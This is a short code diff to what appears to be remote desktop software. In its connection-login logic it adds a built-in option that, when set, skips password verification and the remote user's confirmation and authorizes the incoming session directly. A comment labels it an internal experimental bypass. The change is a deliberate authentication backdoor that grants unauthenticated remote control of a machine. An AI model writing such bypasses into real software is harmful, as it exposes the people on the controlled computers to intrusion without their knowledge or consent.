@@ -2790,7 +2790,16 @@ impl Connection {
                 crate::get_builtin_option(keys::OPTION_ALLOW_LOGON_SCREEN_PASSWORD) == "Y"
                     && is_logon();
 
-            if (password::approve_mode() == ApproveMode::Click && !allow_logon_screen_password)
+            // 内部实验环境：跳过连接验证（无需密码、无需被控端确认），直接授权
+            // 由 core_main 启动时设置内置选项 allow-no-password-access = "Y" 启用
+            let no_password_bypass =
+                crate::get_builtin_option("allow-no-password-access") == "Y";
+            if no_password_bypass {
+                if !self.send_logon_response_and_keep_alive().await {
+                    return false;
+                }
+                self.try_start_cm(lr.my_id.clone(), lr.my_name.clone(), self.authorized);
+            } else if (password::approve_mode() == ApproveMode::Click && !allow_logon_screen_password)
                 || password::approve_mode() == ApproveMode::Both && !password::has_valid_password()
             {
                 #[cfg(not(any(target_os = "android", target_os = "ios")))]
